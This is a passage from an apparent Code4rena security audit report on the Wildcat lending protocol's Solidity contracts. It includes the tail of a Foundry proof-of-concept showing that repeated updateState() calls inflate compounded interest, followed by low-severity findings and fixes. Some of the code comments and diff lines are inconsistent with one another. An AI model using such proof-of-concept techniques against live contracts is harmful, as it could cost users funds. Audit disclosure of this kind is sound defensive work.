            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: 0,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        WildcatMarketControllerFactory controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup borrower
        BORROWER = makeAddr("BORROWER");
        archController.registerBorrower(BORROWER);

        // Setup lender
        LENDER = makeAddr("LENDER");
        asset.mint(LENDER, 1000e18);

        // Deploy controller
        vm.prank(BORROWER);
        controller = WildcatMarketController(controllerFactory.deployController());

        // Register lender
        address[] memory arr = new address[](1);
        arr[0] = LENDER;
        vm.prank(BORROWER);
        controller.authorizeLenders(arr);
    }

    function test_lenderCanInflateInterestRate() public {
        // Deploy market with 10% annual interest rate
        vm.prank(BORROWER);
        address _market = controller.deployMarket(
            address(asset),
            "Market ",
            "MKT-",
            type(uint128).max,
            500, // annual interest rate = 50%
            0, // delinquency fee = 0%
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        WildcatMarket market = WildcatMarket(_market);

        // Lender deposits into market
        vm.startPrank(LENDER);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Save a snapshot before interest compounding
        uint256 snapshot = vm.snapshot();

        // Calculate assets owed by borrower after 1 year
        skip(365 days);
        market.updateState();
        console2.log("Assets owed:", market.balanceOf(LENDER));

        // Revert to before interest compounding
        vm.revertTo(snapshot);

        // Calculate assets owed if updateState() were to be called every week
        for (uint256 i = 0; i < 52; ++i) {
            skip(1 weeks);
            market.updateState();
        }
        console2.log("Assets owed:", market.balanceOf(LENDER));
    }
}
```

### Recommendation

In `_getUpdatedState()`, consider calling `updateScaleFactorAndFees()` after a certain time period has passed, such as a week. This ensures that a lender cannot intentionally call `updateState()` repeatedly to inflate the interest rate. 

## [L-02] `deployMarket()` might be DOSed depending on the origination fee configuration 

### Bug Description

In `deployMarket()`, the origination fee is transferred to the `feeRecipient` as follows:

[WildcatMarketController.sol#L345-L347](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L345-L347)

```solidity
    if (originationFeeAsset != address(0)) {
      originationFeeAsset.safeTransferFrom(borrower, parameters.feeRecipient, originationFeeAmount);
    }
```

The function only checks if `originationFeeAsset` is a non-zero address before calling `safeTransferFrom()`. 

This could cause `deployMarket()` to revert if `originationFeeAsset` is set to a token that reverts when transferring a zero value amount (eg. [LEND](https://etherscan.io/token/0x80fB784B7eD66730e8b1DBd9820aFD29931aab03)), and `originationFeeAmount` is set to 0.

### Impact

If the protocol's origination fee is configured as 0, but `originationFeeAsset` is a ERC20 token that reverts for zero-value transfers, `deployMarket()` will be DOSed.

### Recommendation

Consider checking that `originationFeeAmount` is non-zero as well:

[WildcatMarketController.sol#L345-L347](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L345-L347)

```diff
-   if (originationFeeAsset != address(0)) {
+   if (originationFeeAsset != address(0) && originationFeeAmount != 0) {
      originationFeeAsset.safeTransferFrom(borrower, parameters.feeRecipient, originationFeeAmount);
    }
```

## [L-03] `resetReserveRatio()` cannot be called if the market is delinquent

### Bug Description

When a borrower first changes a market's annual interest rate using `setAnnualInterestBips()`, the market's reserve ratio is set to 90%. After 2 weeks, the borrower can call `resetReserveRatio()` to reset the reserve ratio back to its original value.

`resetReserveRatio()` calls `setReserveRatioBips()` to reset the market's reserve ratio:

[WildcatMarketController.sol#L499](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L499)

```solidity
    WildcatMarket(market).setReserveRatioBips(uint256(tmp.reserveRatioBips).toUint16());
```

However, `setReserveRatioBips()` checks that the market is not delinquent when decreasing its reserve ratio:

[WildcatMarketConfig.sol#L180-L184](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketConfig.sol#L180-L184)

```solidity
    if (_reserveRatioBips < initialReserveRatioBips) {
      if (state.liquidityRequired() > totalAssets()) {
        revert InsufficientReservesForOldLiquidityRatio();
      }
    }
```

This means that if a market becomes delinquent after `setAnnualInterestBips()` and the borrower has no funds to bring the market's reserve ratio back above delinquency, he will be unable to reset the market's reserve ratio.

### Impact

A borrower could be unable to call `resetReserveRatio()` even after 2 weeks if his market is still delinquent. This could be unfair to a borrower since calling `resetReserveRatio()` will most probably make the market non-delinquent, since it reduces the reserve ratio.

Note that a borrower can side-step this issue by using a flashloan, transferring assets into the market, calling `resetReserveRatio()` and then borrowing the assets to repay the flashloan. This, however, might incur a flashloan fee.

### Recommendation

In `resetReserveRatio()`, consider setting the market's reserve ratio directly instead of calling `setReserveRatioBips()` to avoid the check shown above.

## [L-04] Maximum amount of assets that can be deposited into a market is implicitly limited to `uint104`

### Bug Description

According to the [README](https://github.com/code-423n4/2023-10-wildcat/tree/main#additional-context), the amount of assets that can be borrowed in a market should be up to `type(uint128).max`:

> The `totalSupply` is nowhere near 2^128.

Whenever a lender calls `depositUpTo()` to deposit assets, the asset amount is scaled up and added to `scaledTotalSupply`:

[WildcatMarket.sol#L55-L56](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L55-L56)

```solidity
    // Scale the mint amount
    uint104 scaledAmount = state.scaleAmount(amount).toUint104();
```

[WildcatMarket.sol#L70-L71](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L70-L71)

```solidity
    // Increase supply
    state.scaledTotalSupply += scaledAmount;
```

However, `scaledTotalSupply` is a `uint104` instead of `uint128`:

[MarketState.sol#L20-L21](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/MarketState.sol#L20-L21)

```solidity
  // Scaled token supply (divided by scaleFactor)
  uint104 scaledTotalSupply;
```

This means that the maximum amount of assets that can be borrowed through a market is implicitly limited by `type(uint104).max * scaleFactor / 1e27`.

When a market is first deployed, its `scaleFactor` is `1e27`, which limits the maximum amount borrowable to `type(uint104).max`.

### Impact

Borrowers will not be able to borrow more than `type(uint104).max` assets, which limits the functionality of the protocol should an underlying asset have high decimals (eg. 24) and a total supply more than `type(uint104).max`.

### Recommendation

Consider increasing the precision of `scaleFactor`, such as changing it to a `uint128` instead.

## [L-05] Only allow lenders to call `executeWithdrawal()` for themselves

### Bug Description

In `WildcatMarketWithdrawals.sol`, the `executeWithdrawal()` function has no access controls:

[WildcatMarketWithdrawals.sol#L137-L140](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L137-L140)

```solidity
  function executeWithdrawal(
    address accountAddress,
    uint32 expiry
  ) external nonReentrant returns (uint256) {
```

This means that anyone can call the function and specify any lender as the `accountAddress` to withdraw assets to the lender's address.

### Impact

Lenders might not want their assets to be transferred to their address without their permission. For example, a lender's address could be a smart contract wallet that is compromised or going through an upgrade, and is unable to receive funds temporarily.

### Recommendation

Do not allow `executeWithdrawal()` to be called for any lender on their behalf. This can be achieved by removing the `accountAddress` parameter, and using `msg.sender` as the lender's address instead.

## [N-01] Avoid calling `_writeState()` before transferring assets in `borrow()`

`borrow()` calls `_writeState()` before transferring assets to the the borrower:

[WildcatMarket.sol#L128-L129](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L128-L129)

```solidity
    _writeState(state);
    asset.safeTransfer(msg.sender, amount);
```

However, `_writeState()` calls `totalAssets()` when checking if the market is delinquent:

[WildcatMarketBase.sol#L448-L453](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L448-L453)

```solidity
  function _writeState(MarketState memory state) internal {
    bool isDelinquent = state.liquidityRequired() > totalAssets();
    state.isDelinquent = isDelinquent;
    _state = state;
    emit StateUpdated(state.scaleFactor, isDelinquent);
  }
```

`totalAssets()` returns the current asset balance of the market:

[WildcatMarketBase.sol#L238-L240](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L238-L240)

```solidity
  function totalAssets() public view returns (uint256) {
    return IERC20(asset).balanceOf(address(this));
  }
```

Since the transfer of assets is only performed _after_ `_writeState()` is called, `totalAssets()` will be higher than it should be in `_writeState()`. 

Note that there currently isn't any risk of this causing `_writeState()` to update the market's delinquency status incorrectly, since:
- If a market was already delinquent, `borrowableAssets()` would return 0. Hence, `borrow()` cannot possibly update the market from delinquent to non-delinquent.
- `borrowableAssets()` prevents `borrow()` from making the market delinquent, hence the market cannot go from non-delinquent to delinquent.

### Recommendation

Consider calling `_writeState()` after assets have been transferred to the borrower:

[WildcatMarket.sol#L128-L129](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L128-L129)

```diff
-   _writeState(state);
    asset.safeTransfer(feeRecipient, withdrawableFees);
+   _writeState(state);
```

## [N-02] Code for `push()` in `FIFOQueue.sol` can be shortened

The following code:

[FIFOQueue.sol#L55-L59](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/FIFOQueue.sol#L55-L59)

```solidity
  function push(FIFOQueue storage arr, uint32 value) internal {
    uint128 nextIndex = arr.nextIndex;
    arr.data[nextIndex] = value;
    arr.nextIndex = nextIndex + 1;
  }
```

can be shortened to:

```solidity
  function push(FIFOQueue storage arr, uint32 value) internal {
    arr.data[arr.nextIndex++] = value;
  }
```

## [N-03] Redundant checks in `WildcatMarketBase`'s constructor

The constructor of the `WildcatMarketBase` contract contains the following checks:

[WildcatMarketBase.sol#L79-L93](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L79-L93)

```solidity
    if ((parameters.protocolFeeBips > 0).and(parameters.feeRecipient == address(0))) { // redundant
      revert FeeSetWithoutRecipient();
    }
    if (parameters.annualInterestBips > BIP) { // redundant
      revert InterestRateTooHigh();
    }
    if (parameters.reserveRatioBips > BIP) { // redundant
      revert ReserveRatioBipsTooHigh();
    }
    if (parameters.protocolFeeBips > BIP) {
      revert InterestFeeTooHigh();
    }
    if (parameters.delinquencyFeeBips > BIP) { // redundant
      revert PenaltyFeeTooHigh();
    }
```

However, these checks are redundant as they are already accounted for in `WildcatMarketControllerFactory.sol`:

[WildcatMarketControllerFactory.sol#L79-L90](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L79-L90)

```solidity
    if (
      constraints.minimumAnnualInterestBips > constraints.maximumAnnualInterestBips ||
      constraints.maximumAnnualInterestBips > 10000 ||
      constraints.minimumDelinquencyFeeBips > constraints.maximumDelinquencyFeeBips ||
      constraints.maximumDelinquencyFeeBips > 10000 ||
      constraints.minimumReserveRatioBips > constraints.maximumReserveRatioBips ||
      constraints.maximumReserveRatioBips > 10000 ||
      constraints.minimumDelinquencyGracePeriod > constraints.maximumDelinquencyGracePeriod ||
      constraints.minimumWithdrawalBatchDuration > constraints.maximumWithdrawalBatchDuration
    ) {
      revert InvalidConstraints();
    }
```

[WildcatMarketControllerFactory.sol#L201-L210](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L201-L210)

```solidity
    bool hasOriginationFee = originationFeeAmount > 0;
    bool nullFeeRecipient = feeRecipient == address(0);
    bool nullOriginationFeeAsset = originationFeeAsset == address(0);
    if (
      (protocolFeeBips > 0 && nullFeeRecipient) ||
      (hasOriginationFee && nullFeeRecipient) ||
      (hasOriginationFee && nullOriginationFeeAsset)
    ) {
      revert InvalidProtocolFeeConfiguration();
    }
```

### Recommendation

Consider removing the checks that are marked as "redundant" above.